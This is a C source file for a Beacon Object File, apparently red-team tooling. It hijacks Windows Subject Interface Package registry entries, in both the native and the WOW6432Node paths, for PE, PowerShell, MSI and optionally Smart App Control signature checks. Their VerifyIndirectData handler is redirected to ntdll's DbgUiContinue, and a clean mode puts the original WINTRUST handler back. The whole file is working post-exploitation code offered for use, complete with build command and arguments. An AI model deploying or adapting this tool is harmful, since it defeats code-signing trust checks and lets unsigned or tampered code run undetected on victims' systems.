/*
 * tmb_sip_hijack.c - SIP VerifyIndirectData redirect via DbgUiContinue
 *
 * Writes both native and WOW6432Node SIP registry paths.
 *
 * Args (via BeaconDataParse):
 *   short: action (0 = hijack, 1 = clean)
 *   short: flags  (bit 0 = all-sips, bit 1 = sac)
 *   char*: guid_list (comma-separated aliases, empty = default pe,ps1,msi)
 *
 * Build: x86_64-w64-mingw32-gcc -o bofs/bin/tmb_sip_hijack.o -c bofs/src/tmb_sip_hijack.c -I bofs/include -Wall -Wno-unused-function
 */

#include "tmb_bof.h"

static BOOL tmb_ascii_eq_nocase(const char *a, const char *b) {
    while (*a && *b) {
        char ca = (*a >= 'A' && *a <= 'Z') ? (*a + 32) : *a;
        char cb = (*b >= 'A' && *b <= 'Z') ? (*b + 32) : *b;
        if (ca != cb) return FALSE;
        a++;
        b++;
    }
    return (*a == 0 && *b == 0);
}

static BOOL tmb_wstr_eq(const wchar_t *a, const wchar_t *b) {
    while (*a && *b) {
        if (*a != *b) return FALSE;
        a++;
        b++;
    }
    return (*a == 0 && *b == 0);
}

static void tmb_guid_to_ascii(const wchar_t *src, char *dst, int max) {
    int i = 0;
    if (max <= 0) return;
    while (src[i] && i < (max - 1)) {
        dst[i] = (char)src[i];
        i++;
    }
    dst[i] = 0;
}

static void tmb_copy_ascii(char *dst, const char *src, int max) {
    int i = 0;
    if (max <= 0) return;
    if (!src) src = "";
    while (src[i] && i < (max - 1)) {
        dst[i] = src[i];
        i++;
    }
    dst[i] = 0;
}

static void tmb_trim_ascii(char *s) {
    int start = 0, end = 0, i = 0;
    while (s[end]) end++;
    while (s[start] == ' ' || s[start] == '\t') start++;
    while (end > start && (s[end - 1] == ' ' || s[end - 1] == '\t')) end--;
    while (start < end) s[i++] = s[start++];
    s[i] = 0;
}

static BOOL tmb_guid_seen(const wchar_t **guids, int count, const wchar_t *guid) {
    int i;
    for (i = 0; i < count; i++) {
        if (tmb_wstr_eq(guids[i], guid)) return TRUE;
    }
    return FALSE;
}

static BOOL tmb_add_guid(const wchar_t **guids, int *count, int max, const wchar_t *guid) {
    if (!guid) return FALSE;
    if (tmb_guid_seen(guids, *count, guid)) return TRUE;
    if (*count >= max) return FALSE;
    guids[*count] = guid;
    (*count)++;
    return TRUE;
}

static BOOL tmb_collect_sips(short flags, const char *guid_list, const wchar_t **guids, int *count) {
    const char *default_aliases[] = {"pe", "ps1", "msi"};
    int i;

    *count = 0;

    if (flags & 1) {
        for (i = 0; GUID_ALIASES[i].alias; i++) {
            if (!(flags & 2) && tmb_ascii_eq_nocase(GUID_ALIASES[i].alias, "sac")) continue;
            if (!tmb_add_guid(guids, count, 16, GUID_ALIASES[i].guid_str)) {
                TMB_ERR("Too many SIP GUIDs selected.");
                return FALSE;
            }
        }
        return (*count > 0);
    }

    if (!guid_list || !*guid_list) {
        for (i = 0; i < 3; i++) {
            const wchar_t *guid = tmb_resolve_alias(default_aliases[i], NULL);
            if (!tmb_add_guid(guids, count, 16, guid)) {
                TMB_ERR("Failed to add default SIP alias: %s", default_aliases[i]);
                return FALSE;
            }
        }
    } else {
        char work[256];
        char *cur;
        tmb_copy_ascii(work, guid_list, sizeof(work));
        cur = work;

        while (*cur) {
            char *next = cur;
            while (*next && *next != ',') next++;
            if (*next == ',') {
                *next = 0;
                next++;
            }

            tmb_trim_ascii(cur);
            if (*cur) {
                const wchar_t *guid = tmb_resolve_alias(cur, NULL);
                if (!guid) {
                    TMB_ERR("Unknown SIP alias: %s", cur);
                    TMB_INFO("Available aliases include: pe, java, cab, msi, ps1, jscript, vbscript, wsf, appx, appx-bundle, ctl, catalog, esd, sac");
                    return FALSE;
                }
                if (!tmb_add_guid(guids, count, 16, guid)) {
                    TMB_ERR("Too many SIP GUIDs selected.");
                    return FALSE;
                }
            }

            cur = next;
        }
    }

    if (flags & 2) {
        const wchar_t *sac = tmb_resolve_alias("sac", NULL);
        if (!tmb_add_guid(guids, count, 16, sac)) {
            TMB_ERR("Failed to add Smart App Control SIP.");
            return FALSE;
        }
    }

    return (*count > 0);
}

static void tmb_print_undo(const char *guid_list, short flags) {
    if (flags & 1) {
        TMB_INFO("Undo: tmb_sip_hijack --clean --all-sips%s", (flags & 2) ? " --sac" : "");
    } else if (guid_list && *guid_list) {
        TMB_INFO("Undo: tmb_sip_hijack --clean --sip-types %s%s", guid_list, (flags & 2) ? " --sac" : "");
    } else {
        TMB_INFO("Undo: tmb_sip_hijack --clean%s", (flags & 2) ? " --sac" : "");
    }
}

void go(char *args, int alen) {
    const wchar_t *guids[16];
    int count = 0;
    int i;
    BOOL ok = TRUE;

    if (!tmb_init()) { TMB_ERR("Failed to resolve NT API."); return; }

    datap parser;
    BeaconDataParse(&parser, args, alen);
    short action = BeaconDataShort(&parser);
    short flags = BeaconDataShort(&parser);
    char *guid_list = BeaconDataExtract(&parser, NULL);

    if (!tmb_collect_sips(flags, guid_list, guids, &count)) {
        TMB_ERR("No SIP GUIDs selected.");
        return;
    }

    for (i = 0; i < count; i++) {
        wchar_t path[256];
        char guid_ascii[64];

        if (action == 0) {
            WSTR_INIT(dll, L'n',L't',L'd',L'l',L'l',L'.',L'd',L'l',L'l');
            STR_DBGUICONTINUE(func);

            tmb_build_sip_path(FALSE, guids[i], path);
            if (tmb_reg_write_sip(path, dll, func)) {
                tmb_guid_to_ascii(guids[i], guid_ascii, sizeof(guid_ascii));
                TMB_INFO("Native  : %s", guid_ascii);
            } else {
                tmb_guid_to_ascii(guids[i], guid_ascii, sizeof(guid_ascii));
                TMB_ERR("Native SIP write failed: %s", guid_ascii);
                ok = FALSE;
            }

            tmb_build_sip_path(TRUE, guids[i], path);
            if (tmb_reg_write_sip(path, dll, func)) {
                tmb_guid_to_ascii(guids[i], guid_ascii, sizeof(guid_ascii));
                TMB_INFO("WOW6432 : %s", guid_ascii);
            } else {
                tmb_guid_to_ascii(guids[i], guid_ascii, sizeof(guid_ascii));
                TMB_ERR("WOW6432Node SIP write failed: %s", guid_ascii);
                ok = FALSE;
            }
        } else {
            STR_WINTRUST(dll);
            STR_CRYPTSIPVERIFY(func);

            tmb_build_sip_path(FALSE, guids[i], path);
            if (tmb_reg_write_sip(path, dll, func)) {
                tmb_guid_to_ascii(guids[i], guid_ascii, sizeof(guid_ascii));
                TMB_INFO("Restored native  : %s", guid_ascii);
            } else {
                tmb_guid_to_ascii(guids[i], guid_ascii, sizeof(guid_ascii));
                TMB_ERR("Native SIP restore failed: %s", guid_ascii);
                ok = FALSE;
            }

            tmb_build_sip_path(TRUE, guids[i], path);
            if (tmb_reg_write_sip(path, dll, func)) {
                tmb_guid_to_ascii(guids[i], guid_ascii, sizeof(guid_ascii));
                TMB_INFO("Restored WOW6432 : %s", guid_ascii);
            } else {
                tmb_guid_to_ascii(guids[i], guid_ascii, sizeof(guid_ascii));
                TMB_ERR("WOW6432Node SIP restore failed: %s", guid_ascii);
                ok = FALSE;
            }
        }
    }

    if (!ok) {
        TMB_ERR("One or more SIP registry writes failed. Verify admin privileges.");
        return;
    }

    if (action == 0) {
        TMB_OK("SIP VerifyIndirectData redirected to ntdll.dll!DbgUiContinue.");
        TMB_WARN("Affects new processes after SIP cache refresh.");
        tmb_print_undo(guid_list, flags);
    } else {
        TMB_OK("SIP VerifyIndirectData restored to WINTRUST.DLL!CryptSIPVerifyIndirectData.");
    }
}
